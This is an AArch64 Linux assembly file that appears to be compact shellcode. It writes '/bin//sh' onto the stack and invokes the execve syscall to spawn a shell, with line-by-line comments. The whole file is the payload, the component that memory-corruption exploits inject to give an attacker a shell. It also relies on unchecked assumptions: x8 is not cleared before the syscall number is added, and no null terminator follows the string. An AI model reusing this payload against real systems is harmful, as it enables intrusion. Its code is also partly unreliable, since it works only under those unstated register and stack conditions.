.global _start
.text

_start:
	// "/bin//sh"
	movz x3, #0x622f
	movk x3, #0x6e69, lsl #16
	movk x3, #0x2f2f, lsl #32
	movk x3, #0x6873, lsl #48

	sub sp, sp, #16		// stack space
	
	str x3, [sp] 		// string on stack
	mov x0, sp		// address of string
	
	eor x1, x1, x1		// argv (NULL)
	sub x2, x2, x2		// envp (NULL)
	add x8, x8, #221	// execve (/usr/include/asm-generic/unistd.h)
	svc #0			// invoke execve syscall
